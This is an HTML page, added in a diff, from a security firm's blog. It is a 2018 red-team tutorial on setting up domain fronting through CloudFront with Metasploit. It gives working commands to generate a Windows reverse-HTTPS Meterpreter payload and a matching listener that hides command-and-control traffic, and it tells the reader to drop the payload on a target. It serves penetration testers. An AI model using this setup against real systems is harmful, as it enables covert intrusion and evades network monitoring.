@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <title>Beyond Binary - TTP: Domain Fronting with Metasploit</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="/css/style.css?7" />
+    <link rel="icon" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="shortcut" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="apple-touch-icon" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="canonical" href="https://beyondbinary.io/articles/bypassing-messagelabs/" />
+
+    <!--[if lt IE 9]>
+      <script src="/js/lib/html5shiv.js"></script>
+      <script src="/js/lib/ie8.js"></script>
+      <script src="/js/lib/respond.min.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <header>
+      <div class="container">
+        <div class="row">
+          <div class="table-row">
+            <div class="col-xs-4 col-sm-3 cell-xs">
+              <a href="/">
+                <img src="/images/beyond-binary-logo.png" srcset="/images/beyond-binary-logo@2x.png 2x" alt="" />
+              </a>
+            </div>
+            <div class="col-xs-8 col-sm-9 cell-xs text-right position-static">
+              <ul class="header-navigation">
+                <li><a href="/">home</a></li>
+                <li><a href="/about/">about</a></li>
+                <li><a href="/services/">services</a></li>
+                <li><a href="/articles/">articles</a></li>
+                <li><a href="/contact/">contact</a></li>
+                <li><a href="/media/">media</a></li>
+              </ul>
+              <svg id="menu-burger" width="64" height="64" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+                <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.0916789,20.818994 53.8166421,0"/>
+                <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.1969746,31.909063 53.8166424,0"/>
+                <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.0916788,42.95698 53.8166422,0"/>
+              </svg>
+            </div>
+          </div>
+        </div>
+      </div>
+      <img class="sticky-morph" src="/images/sticky-morph.png" srcset="/images/sticky-morph@2x.png 2x" alt="" />
+    </header>
+
+    <section>
+      <div class="container">
+        <h2 class="blue-line-through-md"><span>Articles &amp; News&nbsp;</span></h2>
+        <div class="row">
+          <article class="col-md-7">
+            <header>
+              <span class="date">15 March 2018</span>
+              <h1>TTP: Domain Fronting with Metasploit and Meterpreter</h1>
+              <a class="tag" href="/tags/metasploit/">Metasploit</a>
+              <a class="tag" href="/tags/ttp/">TTP</a>
+            </header>
+
+            <h2>Overview</h2>
+
+            <p>Though it isn't widely known, support for Domain Fronting was added to Metasploit and Meterpreter by <a href="https://twitter.com/TheColonial">OJ Reeves</a> in late 2017. Part of the reason that it's not common knowledge is the lack of documentation or discussion around how to use it.</p>
+
+            <p>As a result, we decided to create this post so that users of Metasploit have a decent guide on how to configure and use Domain Fronting over HTTPS with a legitimate certificate. While there are many different options, we’ll be focusing on using Amazon’s CloudFront and Letsencrypt.</p>
+
+            <p>In an attempt to keep this post as short possible we are making the following assumptions before we start:</p>
+
+            <ul>
+              <li>You have already created a cloud-based machine that is set up to run Metasploit.</li>
+              <li>You're using Ubuntu 16.04 (however, the steps for other Linux distributions are very similar).</li>
+              <li>You have a custom domain name ready, and you have configured DNS so that an <code>A</code> record points the domain to your Metasploit box.</li>
+            </ul>
+
+            <p>If you have those things set up and ready to go, read on!</p>
+
+            <h2>Step 1 - Install dependencies</h2>
+
+            <p>We begin by adding the <code>certbot</code> repository to <code>apt</code>:</p>
+
+            <p><pre><code>sudo add-apt-repository ppa:certbot/certbot
+sudo apt-get update</code></pre></p>
+
+            <p>Once added, we can install the required package:</p>
+
+            <p><pre><code>sudo apt-get install certbot apache2 python-certbot-apache</code></pre></p>
+
+            <p>Make sure that Apache2 is running on port <code>80</code> and ready to receive connections by starting the service:</p>
+
+            <p><pre><code>sudo service apache2 start</code></pre></p>
+
+            <h2>Step 2 - Certificate creation with Letsencrypt</h2>
+
+            <p>With the dependencies set up, we're ready to generate the certificate. This is as simple as running the following command (and following the prompts):</p>
+
+            <p><pre><code>certbot --apache -d example.com</code></pre></p>
+
+            <p><strong>Note:</strong> Make sure you specify your own domain name (not example.com).</p>
+
+            <p>If you have correctly configured DNS then the certificate generation process should complete without a problem.</p>
+
+            <h2>Step 3 - Configure CloundFront</h2>
+
+            <p>Start by signing in to the AWS Console (you're using 2FA, right?). Once signed in, you’ll need to browser to <code>Services -> CloudFront</code> (which is under <code>Networking & Content Delivery</code>). Select <code>Create Distribution</code>, and the hit <code>Get Started</code> under the <code>Web</code> option. If all goes to plan you’ll be presented with something similar to the following:</p>
+
+            <p class="img-full-screen-sm"><img src="/images/ttps02/01-cloudfront-origin.png" alt="Origin Settings" /></p>
+
+            <p>The <code>Origin Domain Name</code> is the domain that you have configured to point directly to your Metasploit listener machine, and is the same as the one that you have generated a Letsencrypt certificate for.</p>
+
+            <p>Make sure that <code>Custom SSL Certirficate</code> is chosen for your domain, and then select <code>Request or Import a Certificate with ACM</code>. Follow your nose through the steps/prompts, and paste in the content of your Letsencrypt key and certificate when required.</p>
+
+            <p class="img-full-screen-sm"><img src="/images/ttps02/02-cloudfront-ssl.png" alt="SSL Settings" /></p>
+
+            <p>Cache setting here are very important, so make sure you pay attention to the detail here otherwise things won’t behave as you want them to. Take note of the <code>Object Caching</code> custom values in the image below:</p>
+
+            <p class="img-full-screen-sm"><img src="/images/ttps02/03-cloudfront-cache.png" alt="Caching Behaviour" /></p>
+
+            <p class="img-full-screen-sm"><img src="/images/ttps02/04-cloudfront-cache.png" alt="Caching TTL" /></p>
+
+            <p>Specifying a TTL of <code>0</code> means that nothing is cached by CloudFront, and this forces every request to make it all the way through to our C2 server. Once you've confirmed these settings, finish the creation of the CloudFront domain by following the prompts. It can take a while (possibly more than 30 minutes) for it to become active and fully deployed, so have patience. Once done, you should see the status field indicating that it has finished:</p>
+
+            <p class="img-full-screen-sm"><img src="/images/ttps02/05-cloudfront-domains.png" alt="CloudFront Domains" /></p>
+
+            <h2>Step 4 - Generate a Meterpreter payload</h2>
+
+            <p>Prior to generating a payload a "Domain Frontable" domain should be selected. A great resource of existing options can be found in <a href="https://twitter.com/vysecurity">Vincent Yiu</a>'s <a href="https://github.com/vysec/DomainFrontingLists">Github repository</a>. In our example, we’re using a random one from this list (careers.dksfed.com).</p>
+
+            <p>The key addition to Meterpreter that allowed for Domain Fronting to be supported is the <code>HttpHostHeader</code> parameter (it's an advanced option) that can be specified when generating Meterpreter payloads (both staged and stageless), and when configuring your HTTPS listener. To generate a staged 32-bit payload that utilises the above configuration, invoke <code>msvenom</code> as shown below:</p>
+
+            <p><pre><code>$ msfvenom -p windows/meterpreter/reverse_https LHOST=careers.dksfed.com \
+LPORT=443 HttpHostHeader=d1pd79gjn1xe6f.cloudfront.net \
+-f exe -o ~/path/to/payload.exe</code></pre></p>
+
+            <p><strong>Note:</strong> The <code>HttpHostHeader</code> value must match the <code>Domain</code> value that is generated by CloudFront when you created your CloudFront Domain in the AWS console.</p>
+
+            <p><strong>Note:</strong> It's <em>very</em> important to specify the chosen frontable domain for the <code>LHOST</code> parameter. Specifying an incorrect <code>LHOST</code> for payloads is still one of the most common mistakes when creating payloads and setting up listeners. This value should always specify the host name or IP that Meterpreter should be reaching out to. This value must be the same in both the payload and the listener.</p>
+
+            <h2>Step 5 - Configure and run a listener</h2>
+
+            <p>Given that we want to have Metasploit serving up the Letsencrypt certificate, we're going to need to perform one more quick step first, as Metasploit requires a .pem file in a certain format. Thankfully it’s as simple as combining a few tiles into one, like so:</p>
+
+            <p><pre><code>$ cd /etc/letsencrypt/live/example.com
+$ cat privkey.pem fullchain.pem > /tools/MSF.pem</code></pre></p>
+
+            <p>With that done, launch Metasploit and perform the following actions:</p>
+
+            <p><pre><code>use multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST careers.dksfed.com
+set LPORT 443
+set HttpHostHeader d1pd79gjn1xe6f.cloudfront.net
+set HandlerSSLCert /tools/MSF.pem</code></pre></p>
+
+            <p>The advanced options, when viewed via <code>show advanced</code> should look like this:</p>
+
+            <p class="img-full-screen-sm"><img src="/images/ttps02/06-msf-listener-advanced.png" alt="MSF listener advanced options" /></p>
+
+
+            <p>These settings should match those that were specified when generation the payload via <code>msfvenom</code>. With the settings correct, launch the listener by running:</p>
+
+            <p><pre><code>run -j</code></pre></p>
+
+            <p>When the handler runs, it’ll first generate an error that says:</p>
+
+            <p><pre><code>[-] Handler failed to bind to [HOST]</code></pre></p>
+
+            <p>This is fine and expected. The handler will not be able to bind to the <code>LHOST</code> parameter because it's not present on the local system, and it will fall back to <code>0.0.0.0</code>. If you want to avoid this error in future, you can <code>set ReverseListenerBindAddress 0.0.0.0</code> prior to running the listener.</p>
+
+            <h2>Step 6 - Execute the payload</h2>
+
+            <p>Drop your executable (or PowerShell script, or DLL, or HTA, or whatever it is you generated) on the target system and invoke it. From there you should see a new session come into your Metasploit handler, and it should function as expected.</p> 
+
+            <h2>A few notes</h2>
+
+            <p>The goal of this post was to cover all the key points in the quickest possible manner. However, we'd like to highlight that when we are using this feature during engagements there are a few key differences:</p>
+
+            <ul>
+                <li>We tend to use Nginx instead of Apache2 for basically everything.</li>
+                <li>We don't run Metasploit as root.</li>
+                <li>We use Nginx to reverse proxy the Meterpreter traffic to Metasploit, as this means that Metasploit doesn't need access to the certificates, nor does it need to bind to privileged ports.</li>
+            </ul>
+
+            <p>Your mileage may vary, but we'd recommend that you do something similar!</p>
+
+            <h2>Conclusion</h2>
+
+            <p>With every implementation of Domain Fronting in attack frameworks, there are some nuances that can be difficult to identify without the pain of troubleshooting and debugging. We hope that this helps demystify the process for those people looking to use Domain Fronting with Metasploit.</p>
+
+            <p>This post was written by <a href="https://twitter.com/ausjock">@AusJock</a>. However, please direct any questions, queries, doubtful points or death threats to <a href="https://twitter.com/thecolonial">@TheColonial</a>, he'll be more than happy to accommodate.</p>
+          </article>
+
+          <aside class="col-md-4 col-md-offset-1">
+            <h2 class="blue-line-through-md"><span>Recent&nbsp;</span></h2>
+            <article>
+              <header>
+                <span class="date">15 March 2018</span>
+                <h4 class="text-header upper-case"><a href="/articles/domain-fronting-with-metasploit-and-meterpreter/">TTP: Domain Fronting with Metasploit and Meterpreter</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>Though it isn't widely known, support for Domain Fronting was added to Metasploit and Meterpreter by OJ Reeves in late 2017. Part of the reason that it's not common knowledge is the lack of documentation or discussion around how to use it. As a result, we decided to create this post so that users of Metasploit have a decent guide on how to configure and use Domain Fronting over HTTPS with a legitimate certificate.</p>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/metasploit/">Metasploit</a>
+                <a class="tag" href="/tags/ttp/">TTP</a>
+              </footer>
+            </article>
+
+            <article>
+              <header>
+                <span class="date">01 August 2017</span>
+                <h4 class="text-header upper-case"><a href="/articles/bypassing-messagelabs/">TTP: Bypassing Symantec Email Security.cloud (MessageLabs)</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>During a recent Attack Simulation against a high-profile client, Beyond Binary faced off against Symantec Email Security.cloud (formerly MessageLabs) whilst conducting a variety of phishing campaigns. This was not the first time we had come up against cloud-based email security services, however our usual approaches to bypassing them didn't yield any fruit.</p>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/messagelabs/">MessageLabs</a>
+                <a class="tag" href="/tags/ttp/">TTP</a>
+              </footer>
+            </article>
+
+            <article>
+              <header>
+                <span class="date">10 March 2015</span>
+                <h4 class="text-header upper-case"><a href="/articles/seagate-nas-rce-response-analysis/">Opinion: Seagate's Analysis is Incorrect</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>On March 1st 2015 Beyond Binary went public with an advisory that disclosed 0day flaws in Seagate Business Storage 2-Bay NAS devices. Days later, Seagate responded to the advisory through a number of channels:</p>
+                <ul>
+                  <li>A direct email to Beyond Binary</li>
+                </ul>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/opinion/">Opinion</a>
+                <a class="tag" href="/tags/seagate/">Seagate</a>
+              </footer>
+            </article>
+
+            <article>
+              <header>
+                <span class="date">1 March 2015</span>
+                <h4 class="text-header upper-case"><a href="/articles/seagate-nas-rce/">Advisory: Seagate NAS Remote Code Execution Vulnerability</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>Seagate is a well-known vendor of hardware solutions, with products available worldwide. Its line of NAS products targeted at businesses is called Business Storage 2-Bay NAS. These can be found inside home and business networks, and in many cases they are publicly exposed.</p>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/advisory/">Advisory</a>
+                <a class="tag" href="/tags/cve/">CVE</a>
+                <a class="tag" href="/tags/exploit/">Exploit</a>
+                <a class="tag" href="/tags/seagate/">Seagate</a>
+              </footer>
+            </article>
+
+            <article>
+              <header>
+                <span class="date">4 February 2015</span>
+                <h4 class="text-header upper-case"><a href="/articles/teamcity-account-creation/">Advisory: TeamCity Account Creation</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>TeamCity is a multi-platform continuous integration and build server product created by JetBrains. It is used by many development organisations to automate the build and deployment of software solutions as part of the development process. TeamCity is a very popular product and hence the number of installations, both public and private, is quite high.</p>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/advisory/">Advisory</a>
+                <a class="tag" href="/tags/cve/">CVE</a>
+                <a class="tag" href="/tags/exploit/">Exploit</a>
+                <a class="tag" href="/tags/teamcity/">TeamCity</a>
+              </footer>
+            </article>
+
+            <p>
+            <a href="/articles/" class="button full-width-xs">View older articles</a>
+            </p>
+          </aside>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="container">
+        <div class="row">
+          <div class="table-row">
+            <div class="cell-sm col-sm-2 text-center">
+              <p>
+              <a href="/"><img src="/images/beyond-binary-logo.png" srcset="/images/beyond-binary-logo@2x.png 2x" alt="" /></a>
+              </p>
+            </div>
+
+            <div class="cell-sm col-sm-10">
+              <div class="row">
+                <div class="col-sm-11 col-sm-offset-1">
+                  <p><a href="https://twitter.com/BeyondBase2/status/892362430881214464">01 August 2017:&nbsp;</a>Some cloud-based email protection mechanisms are useful. But don’t rely on them, they can and will be bypassed without much effort!</p>
+                  <hr />
+                  <ul class="footer-navigation">
+                    <li><a href="/">home</a></li>
+                    <li><a href="/about/">about</a></li>
+                    <li><a href="/services/">services</a></li>
+                    <li><a href="/articles/">articles</a></li>
+                    <li><a href="/contact/">contact</a></li>
+                    <li><a href="/media/">media</a></li>
+                  </ul>
+                  <p class="small-text">
+                  &copy; Beyond Binary Pty Ltd - ABN 64 146 311 962
+                  </p>
+                </div>
+              </div>
+            </div>   
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script src="/js/lib/jquery-1.11.3.min.js"></script>
+    <script src="/js/lib/jquery-ui.min.js"></script>
+    <script src="/js/lib/snap.svg-min.js"></script>
+    <script src="/js/equal-height.js"></script>
+    <script src="/js/menu-burger.js?3"></script>
+    <script src="/js/hero/hero.js?9"></script>
+    <script src="/js/hero/texts.js?9"></script>
+    <script src="/js/hero/bar.js?9"></script>
+    <script src="/js/hero/morph.js?9"></script>
+    <script src="/js/notification.js"></script>
+    <script src="/js/contact-form.js"></script>
+
+  </body>
